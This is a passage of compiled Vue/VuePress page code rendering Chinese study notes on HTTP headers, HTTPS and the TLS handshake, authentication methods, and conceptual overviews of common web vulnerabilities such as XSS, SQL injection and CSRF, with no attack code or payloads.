"),_("tr",[_("td",[e._v("Content-Range")]),e._v(" "),_("td",[e._v("实体主体的位置范围")])]),e._v(" "),_("tr",[_("td",[e._v("Content-Type")]),e._v(" "),_("td",[e._v("实体主体的媒体类型")])]),e._v(" "),_("tr",[_("td",[e._v("Expires")]),e._v(" "),_("td",[e._v("实体主体过期的日期时间")])]),e._v(" "),_("tr",[_("td",[e._v("Ladt-Modified")]),e._v(" "),_("td",[e._v("资源的最后修改时间")])])])]),e._v(" "),_("h2",{attrs:{id:"https"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#https"}},[e._v("#")]),e._v(" HTTPS")]),e._v(" "),_("p",[e._v("HTTP在安全方面主要有这些不足：")]),e._v(" "),_("ul",[_("li",[e._v("通信使用明文（不加密），内容可能被窃听")]),e._v(" "),_("li",[e._v("不验证通信方的身份，因此有可能遭遇伪装")]),e._v(" "),_("li",[e._v("无法证明报文的完整性，所以有可能已遭篡改")])]),e._v(" "),_("p",[_("strong",[e._v("HTTPS")]),e._v(" = "),_("strong",[e._v("HTTP")]),e._v(" + "),_("strong",[e._v("加密")]),e._v(" + "),_("strong",[e._v("认证")]),e._v(" + "),_("strong",[e._v("完整性保护")])]),e._v(" "),_("ul",[_("li",[e._v("HTTP加上加密处理和认证以及完整性保护后即是HTTPS")]),e._v(" "),_("li",[e._v("HTTPS 是身披SSL 外壳的HTTP\n"),_("ul",[_("li",[e._v("HTTPS并非一种新协议。只是HTTP通信接口部分用SSL和TLS代替而已。")])])])]),e._v(" "),_("h3",{attrs:{id:"加密方式"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#加密方式"}},[e._v("#")]),e._v(" 加密方式")]),e._v(" "),_("ul",[_("li",[e._v("SSL采用公开密钥加密的加密处理方式\n"),_("ul",[_("li",[e._v("共享密钥加密（对称密钥加密）的困境\n"),_("ul",[_("li",[e._v("加密和解密使用同一个密钥的方式称为共享密钥加密（对称密钥加密 ）")]),e._v(" "),_("li",[e._v("以共享密钥加密时必须将密钥也发给对方")]),e._v(" "),_("li",[e._v("如果通信被窃听，那么密钥就会落入攻击者的手里")]),e._v(" "),_("li",[e._v("只要拿到密钥，任何人都可以破解密码")])])]),e._v(" "),_("li",[e._v("使用两把密钥的公开密钥加密\n"),_("ul",[_("li",[e._v("公开密钥使用一对非对称密钥，即私有密钥和公开密钥")]),e._v(" "),_("li",[e._v("使用公开密钥加密的方式\n"),_("ul",[_("li",[e._v("发送密文的一方使用对方的公开密钥进行加密处理")]),e._v(" "),_("li",[e._v("对方收到加密的信息后，再使用自己的私有密钥进行解密")])])]),e._v(" "),_("li",[e._v("不需要发送用来解密的私有密钥，也不必担心密钥被攻击者窃听而盗走")])])]),e._v(" "),_("li",[e._v("HTTPS采用混合加密机制\n"),_("ul",[_("li",[e._v("HTTPS采用共享密钥加密和公开密钥加密两者并用的混合加密机制")]),e._v(" "),_("li",[e._v("公开密钥加密处理起来比共享密钥加密方式更为复杂，因此若在通信时使用公开密钥加密方式，效率就很低")]),e._v(" "),_("li",[e._v("充分利用两者各组的优势\n"),_("ul",[_("li",[e._v("在交换密钥环节使用公开密钥加密方式")]),e._v(" "),_("li",[e._v("在建立通信交换报文阶段使用共享密钥加密方式")])])])])])])])]),e._v(" "),_("h3",{attrs:{id:"证书"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#证书"}},[e._v("#")]),e._v(" 证书")]),e._v(" "),_("ul",[_("li",[e._v("证明公开密钥正确性的证书\n"),_("ul",[_("li",[e._v("公开密钥加密方式的问题\n"),_("ul",[_("li",[e._v("无法证明公开密钥本身就是真正的公开密钥")])])]),e._v(" "),_("li",[e._v("使用由数字证书认证机构(CA)和其相关机关颁发的的公开密钥证书\n"),_("ul",[_("li",[e._v("数字证书认证机构处于客户端与服务器双方都可信赖的第三方机构的立场上")]),e._v(" "),_("li",[e._v("服务器会将这份由数字证书认证机构颁发的公钥证书发送给客户端以进行公开密钥加密方式通信")]),e._v(" "),_("li",[e._v("就受到证书的客户端可使用数字证书认证机构的公开密钥，对证书进行认证。")]),e._v(" "),_("li",[e._v("多数浏览器开发商发布版本时，会事先在内部植入常用认证机关的公开密钥")])])]),e._v(" "),_("li",[e._v("可证明组织真实性的EV SSL证书\n"),_("ul",[_("li",[e._v("证书的一个作用是用来证明作为通信一方的服务器是否规范")]),e._v(" "),_("li",[e._v("证书的另外一个作用可确认对方服务器背后运营的企业是否真实存在")]),e._v(" "),_("li",[e._v("EV SSL证书是基于国际标准的认证知道方针颁发的证书")])])]),e._v(" "),_("li",[e._v("用以确认客户端的客户端证书\n"),_("ul",[_("li",[e._v("以客户端证书进行客户端认证，证明服务器正在做通信的对方始终是预料之内的客户端")])])])])])]),e._v(" "),_("h3",{attrs:{id:"通信机制"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#通信机制"}},[e._v("#")]),e._v(" 通信机制")]),e._v(" "),_("ul",[_("li",[e._v("HTTPS的安全通信机制\n"),_("ul",[_("li",[e._v("HTTPS的通信步骤\n"),_("ul",[_("li",[_("img",{attrs:{src:v(393)}})]),e._v(" "),_("li",[e._v("步骤 1： 客户端通过发送 Client Hello 报文开始 SSL 通信。报文中包 含客户端支持的 SSL 的指定版本、加密组件（Cipher Suite）列表（所使用的加密算法及密钥长度等）。")]),e._v(" "),_("li",[e._v("步骤 2： 服务器可进行 SSL 通信时，会以 Server Hello 报文作为应答。和客户端一样，在报文中包含 SSL 版本以及加密组件。服务器的 加密组件内容是从接收到的客户端加密组件内筛选出来的。")]),e._v(" "),_("li",[e._v("步骤 3： 之后服务器发送 Certificate 报文。报文中包含公开密钥证书。")]),e._v(" "),_("li",[e._v("步骤 4： 最后服务器发送 Server Hello Done 报文通知客户端，最初阶 段的 SSL 握手协商部分结束。")]),e._v(" "),_("li",[e._v("步骤 5： SSL 第一次握手结束之后，客户端以 Client Key Exchange 报 文作为回应。报文中包含通信加密中使用的一种被称为 Pre-master secret 的随机密码串。该报文已用步骤 3 中的公开密钥进行加密。")]),e._v(" "),_("li",[e._v("步骤 6： 接着客户端继续发送 Change Cipher Spec 报文。该报文会提 示服务器，在此报文之后的通信会采用 Pre-master secret 密钥加密。")]),e._v(" "),_("li",[e._v("步骤 7： 客户端发送 Finished 报文。该报文包含连接至今全部报文的 整体校验值。这次握手协商是否能够成功，要以服务器是否能够正确 解密该报文作为判定标准。")]),e._v(" "),_("li",[e._v("步骤 8： 服务器同样发送 Change Cipher Spec 报文。")]),e._v(" "),_("li",[e._v("步骤 9： 服务器同样发送 Finished 报文。")]),e._v(" "),_("li",[e._v("步骤 10： 服务器和客户端的 Finished 报文交换完毕之后，SSL 连接 就算建立完成。当然，通信会受到 SSL 的保护。从此处开始进行应用 层协议的通信，即发送 HTTP 请求。")]),e._v(" "),_("li",[e._v("步骤 11： 应用层协议通信，即发送 HTTP 响应。")]),e._v(" "),_("li",[e._v("步骤 12： 最后由客户端断开连接。断开连接时，发送 close_notify 报 文。上图做了一些省略，这步之后再发送 TCP FIN 报文来关闭与 TCP 的通信。")])])]),e._v(" "),_("li",[e._v("在以上流程中，应用层发送数据时会附加一种叫做 MAC（Message Authentication Code）的报文摘要。MAC 能够查知报文是否遭到篡改，从而保护报文的完整性。\n下面是对整个流程的图解。图中说明了从仅使用服务器端的公开密钥 证书（服务器证书）建立 HTTPS 通信的整个过程。")])])])]),e._v(" "),_("img",{attrs:{src:v(394)}}),e._v(" "),_("ul",[_("li",[e._v("SSL和TLS\n"),_("ul",[_("li",[e._v("HTTPS使用SSL和TLS这两个协议\n"),_("ul",[_("li",[e._v("TSL是以SSL为原型开发的协议，有时统一称该协议为SSL")])])]),e._v(" "),_("li",[e._v("HTTPS是使用SSL时，处理速度会变慢\n"),_("ul",[_("li",[e._v("通信慢")]),e._v(" "),_("li",[e._v("大量消耗CPU及内存等资源导致的处理速度变慢")])])])])]),e._v(" "),_("li",[e._v("为什么不一直使用HTTPS\n"),_("ul",[_("li",[e._v("节约资源\n"),_("ul",[_("li",[e._v("会消耗相当多的资源，平摊下来，能够处理的请求数量必定会减少")])])]),e._v(" "),_("li",[e._v("节约购买证书的开销")])])])]),e._v(" "),_("h2",{attrs:{id:"认证"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#认证"}},[e._v("#")]),e._v(" 认证")]),e._v(" "),_("p",[e._v("某些web页面只想让特定的人浏览，实现这个目的需要的就是认证功能")]),e._v(" "),_("p",[e._v("为了确认是都有访问的权限，需要核对信息，通常指以下这些信息：")]),e._v(" "),_("ul",[_("li",[e._v("密码：只有本人才会知道的字符串信息")]),e._v(" "),_("li",[e._v("动态令牌：仅限本人持有的设备内显示的一次性密码")]),e._v(" "),_("li",[e._v("数字证书：仅限本人（终端）持有的信息")]),e._v(" "),_("li",[e._v("生物认证：指纹和虹膜等本人的生理信息")]),e._v(" "),_("li",[e._v("IC卡等：仅限本人持有的信息")])]),e._v(" "),_("p",[e._v("HTTP/1.1使用的认证方式")]),e._v(" "),_("ul",[_("li",[e._v("BASIC认证（基本认证）\n"),_("ul",[_("li",[e._v("BASIC认证使用上不够灵活，且达不到多数web网站期望的安全性等级，所以并不常用")])])]),e._v(" "),_("li",[e._v("DIGEST认证（摘要认证）\n"),_("ul",[_("li",[e._v("DIGEST认证和BASIC认证一样使用上不够灵活，且仍然达不到多数web网站对高度安全等级的追求标准，所以适用范围也有所受限")])])]),e._v(" "),_("li",[e._v("SSL客户端认证\n"),_("ul",[_("li",[e._v("虽然具有高度的安全等级，但因为导入及维持费用等问题，尚未普及")])])]),e._v(" "),_("li",[e._v("FormBase认证（基于表单认证）\n"),_("ul",[_("li",[e._v("认证多半为表单认证")]),e._v(" "),_("li",[e._v("使用Cookie来管理Session，以弥补HTTP协议中不存在的状态管理功能")])])])]),e._v(" "),_("h2",{attrs:{id:"安全防范"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#安全防范"}},[e._v("#")]),e._v(" 安全防范")]),e._v(" "),_("h3",{attrs:{id:"因输出值转义不完全引发的安全漏洞"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#因输出值转义不完全引发的安全漏洞"}},[e._v("#")]),e._v(" 因输出值转义不完全引发的安全漏洞")]),e._v(" "),_("ul",[_("li",[_("strong",[e._v("跨站脚本攻击（XSS）")]),e._v(" "),_("ul",[_("li",[e._v("指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击")]),e._v(" "),_("li",[e._v("造成以下影响\n"),_("ul",[_("li",[e._v("利用虚假输入表单片区用户个人信息")]),e._v(" "),_("li",[e._v("利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求")]),e._v(" "),_("li",[e._v("显示伪造的文章或图片")])])]),e._v(" "),_("li",[e._v("XSS是攻击者利用预先设置的陷阱出发的被动攻击")])])]),e._v(" "),_("li",[e._v("SQL注入攻击\n"),_("ul",[_("li",[e._v("指针对Web应用使用的数据库，通过运行非法的SQL而产生的攻击")]),e._v(" "),_("li",[e._v("造成以下影响\n"),_("ul",[_("li",[e._v("非法查看或篡改数据库内的数据")]),e._v(" "),_("li",[e._v("规避认证")]),e._v(" "),_("li",[e._v("执行和数据库服务器业务关联的程序等")])])])])]),e._v(" "),_("li",[e._v("OS命令注入攻击\n"),_("ul",[_("li",[e._v("指通过Web应用执行非法的操作系统命令达到攻击的目的")]),e._v(" "),_("li",[e._v("只要能调用Shell函数的地方就有存在被攻击的风险")]),e._v(" "),_("li",[e._v("造成以下影响\n"),_("ul",[_("li",[e._v("让Windows或Linux操作系统的命令行启动程序")]),e._v(" "),_("li",[e._v("获取Shell能获得的信息")])])])])]),e._v(" "),_("li",[e._v("HTTP首部注入攻击\n"),_("ul",[_("li",[e._v("指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的以一种攻击。")]),e._v(" "),_("li",[e._v("是被动攻击模式")]),e._v(" "),_("li",[e._v("向首部主体内添加内容的攻击称为HTTP响应截断攻击")]),e._v(" "),_("li",[e._v("造成以下影响\n"),_("ul",[_("li",[e._v("设置任何Cookie信息")]),e._v(" "),_("li",[e._v("重定向至任意URL")]),e._v(" "),_("li",[e._v("显示任意的主体（HTTP响应截断攻击）")])])])])]),e._v(" "),_("li",[e._v("邮件首部注入攻击\n"),_("ul",[_("li",[e._v("指Web应用中的邮件发送功能，攻击者通过想邮件首部To或Subject内任意添加非法内容发起的攻击")]),e._v(" "),_("li",[e._v("利用存在安全漏洞的Web网站，可对任意邮件地址发送广告邮件或病毒邮件")])])]),e._v(" "),_("li",[e._v("目录便利攻击\n"),_("ul",[_("li",[e._v("指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击。")]),e._v(" "),_("li",[e._v("有时也称为路径遍历攻击")]),e._v(" "),_("li",[e._v("固然存在输出值转义的问题，但更应该关闭指定对任意文件名的访问权限")])])]),e._v(" "),_("li",[e._v("远程文件包含漏洞\n"),_("ul",[_("li",[e._v("指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的URL充当依赖文件，让脚本读取后，就可运行任意脚本的一种攻击")]),e._v(" "),_("li",[e._v("固然存在输出值转义的问题，但更应该控制对任意文件名的指定")])])])]),e._v(" "),_("h3",{attrs:{id:"因设置或设计上的缺陷引发的安全漏洞"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#因设置或设计上的缺陷引发的安全漏洞"}},[e._v("#")]),e._v(" 因设置或设计上的缺陷引发的安全漏洞")]),e._v(" "),_("ul",[_("li",[e._v("强制浏览\n"),_("ul",[_("li",[e._v("指从安置在Web服务器的公开目录下的文件中，浏览哪些原本非自愿公开的文件")]),e._v(" "),_("li",[e._v("造成以下影响\n"),_("ul",[_("li",[e._v("泄露顾客的个人信息等重要情报")]),e._v(" "),_("li",[e._v("泄露原本需要具有访问权限的用户才可查阅的信息内容")]),e._v(" "),_("li",[e._v("泄露为外连到外界的文件")])])])])]),e._v(" "),_("li",[e._v("不正确的错误消息处理\n"),_("ul",[_("li",[e._v("指Web应用的错误信息内包含对攻击者有用的信息")]),e._v(" "),_("li",[e._v("与Web应用有关的主要错误信息如下所示\n"),_("ul",[_("li",[e._v("Web应用抛出的错误消息")]),e._v(" "),_("li",[e._v("数据库等系统抛出的错误消息")])])]),e._v(" "),_("li",[e._v("为了不让错误消息给攻击者以启发，建议将提示消息的内容仅保留到“认证错误”这种程度")]),e._v(" "),_("li",[e._v("各系统应该对详细的错误消息进行抑制设定，或使用自定义错误消息，以避免某些错误消息给攻击者以启发")])])]),e._v(" "),_("li",[e._v("开放重定向\n"),_("ul",[_("li",[e._v("是一种对指定的任意URL作重定向跳转的功能")]),e._v(" "),_("li",[e._v("与次功能相关联的安全漏洞是指，假如指定的重定向URL到某个具有恶意的web网站，那么用户就会被诱导至那个Web网站")])])])]),e._v(" "),_("h3",{attrs:{id:"因会话管理疏忽引发的安全漏洞"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#因会话管理疏忽引发的安全漏洞"}},[e._v("#")]),e._v(" 因会话管理疏忽引发的安全漏洞")]),e._v(" "),_("ul",[_("li",[e._v("会话劫持\n"),_("ul",[_("li",[e._v("指攻击者通过某种手段拿到了用户的会话ID，并非法使用次会话ID伪装成用户，达到攻击的目的")]),e._v(" "),_("li",[e._v("几种攻击者可获得会话ID的途径\n"),_("ul",[_("li",[e._v("通过非正规的生成方法推测会话ID")]),e._v(" "),_("li",[e._v("通过窃听或XSS攻击盗取会话ID")]),e._v(" "),_("li",[e._v("通过会话固定攻击强行获取会话ID")])])])])]),e._v(" "),_("li",[e._v("会话固定攻击\n"),_("ul",[_("li",[e._v("会话固定攻击会强制用户使用攻击者指定的会话ID")]),e._v(" "),_("li",[e._v("属于被动攻击")])])]),e._v(" "),_("li",[_("strong",[e._v("跨站点请求伪造（CSRF）")]),e._v(" "),_("ul",[_("li",[e._v("指攻击者通过设置好的陷阱，强制对已完成验证的用户进行非预期的个人信息或设定信息等某些状态更新")]),e._v(" "),_("li",[e._v("属于被动攻击")]),e._v(" "),_("li",[e._v("造成一下影响\n"),_("ul",[_("li",[e._v("利用已通过认证的用户权限更新设定信息等")]),e._v(" "),_("li",[e._v("利用已通过认证的用户权限购买商品")]),e._v(" "),_("li",[e._v("利用已通过认证的用户权限在留言板上发表言论")])])])])])]),e._v(" "),_("h3",{attrs:{id:"其他安全漏洞"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#其他安全漏洞"}},[e._v("#")]),e._v(" 其他安全漏洞")]),e._v(" "),_("ul",[_("li",[e._v("密码破解\n"),_("ul",[_("li",[e._v("即算出密码，突破认证")]),e._v(" "),_("li",[e._v("两种手段\n"),_("ul",[_("li",[e._v("通过网络的密码试错\n"),_("ul",[_("li",[e._v("穷举法")]),e._v(" "),_("li",[e._v("字典攻击")])])]),e._v(" "),_("li",[e._v("对已加密密码的破解（指攻击者入侵系统，已获得加密或散列处理的密码数据的情况）\n"),_("ul",[_("li",[e._v("通过穷举法/字典攻击进行类推")]),e._v(" "),_("li",[e._v("彩虹表")]),e._v(" "),_("li",[e._v("获取密钥")]),e._v(" "),_("li",[e._v("加密算法的漏洞")])])])])])])]),e._v(" "),_("li",[_("strong",[e._v("点击劫持")]),e._v(" "),_("ul",[_("li",[e._v("指利用透明的按钮或链接做成陷阱，覆盖在Web页面之上，诱使用户在不知情的情况下，点击链接访问内容的一种攻击手段")]),e._v(" "),_("li",[e._v("也称为界面伪装")])])]),e._v(" "),_("li",[e._v("DoS攻击\n"),_("ul",[_("li",[e._v("指一种让运行中的服务呈停止状态的攻击")]),e._v(" "),_("li",[e._v("有时也叫服务停止攻击或拒绝服务攻击")]),e._v(" "),_("li",[e._v("主要有两种DoS攻击方式\n"),_("ul",[_("li",[e._v("几种利用访问清酒造成资源过载，资源用尽的同时，实际上服务也就呈停止状态")]),e._v(" "),_("li",[e._v("通过攻击安全漏洞是服务停止")])])]),e._v(" "),_("li",[e._v("多台计算机发起的DoS攻击称为DDoS攻击\n"),_("ul",[_("li",[e._v("通常利用感染病毒的计算机作为攻击者的攻击跳板")])])])])]),e._v(" "),_("li",[e._v("后门程序\n"),_("ul",[_("li",[e._v("指开发设置的隐藏入口，可不按正常步骤使用首先功能")]),e._v(" "),_("li",[e._v("通常为以下三种类型\n"),_("ul",[_("li",[e._v("开发阶段作为Debug调用的后门程序")]),e._v(" "),_("li",[e._v("开发者为了自身利益植入的后门程序")]),e._v(" "),_("li",[e._v("攻击者通过某种方法设置的后门程序")])])])])])])])}),[],!1,null,null,null);t.default=a.exports}}]);